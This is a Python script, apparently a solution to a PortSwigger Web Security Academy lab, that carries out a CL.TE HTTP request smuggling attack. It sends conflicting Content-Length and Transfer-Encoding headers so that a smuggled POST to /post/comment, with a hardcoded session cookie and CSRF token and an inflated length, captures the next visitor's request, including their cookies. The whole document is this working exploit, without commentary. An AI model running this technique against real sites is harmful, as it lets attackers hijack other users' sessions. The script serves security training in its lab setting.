import http.client

if __name__ == "__main__":
    lab_id = "0a73002303f03b8986e5a478000500cc" + ".web-security-academy.net"
    cookie_session = "EgEEvY8KzSuGR69EYoGIIxXdvfN18lqK"
    csrf_token = "IKil04qrRr10W6GHOEV3zD9Rqj4pZeiV"
    post_id = "4"

    headers = {
        "Host": f"{lab_id}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "262",
        "Transfer-Encoding": "chunked",
    }

    body = f"0\r\n\r\nPOST /post/comment HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 920\r\nCookie: session={cookie_session}\r\n\r\ncsrf={csrf_token}&postId={post_id}&name=jasdnfk&email=ciao%40gmail.com&website=&comment=sfandl"

    try:
        connection = http.client.HTTPSConnection(lab_id)
        connection.request("POST", "/", body=body, headers=headers)
        response = connection.getresponse()

        if response.status == 200:
            print("OK !")
        else:
            content = response.read().decode("utf-8")
            print(f"NO: {response.status} {response.reason} {content}")
    except Exception as e:
        print("Error ", e)
